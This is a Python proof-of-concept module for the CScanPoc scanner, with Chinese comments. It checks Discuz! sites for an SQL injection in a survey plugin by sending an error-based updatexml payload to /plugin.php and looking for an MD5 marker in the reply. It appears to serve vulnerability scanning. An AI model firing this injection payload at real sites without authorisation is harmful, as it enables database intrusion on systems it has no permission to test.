# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
import math
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Discuz_0007' # 平台漏洞编号，留空
    name = 'Discuz!问卷调查专业版插件注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-05-31'  # 漏洞公布时间
    desc = '''
        Discuz!问卷调查专业版插件注入。
        /plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline%20and%201=(updatexml(1,concat(0x27,MD5(1)),1))--
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/3188/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '591c9883-2948-4374-a920-d9faa873b9cf'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline%20and%201=(updatexml(1,concat(0x27,MD5(1)),1))--" 
            verify_url = '{target}'.format(target=self.target)+payload
            code, head,res, errcode, _  = hh.http(verify_url)
                       
            if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()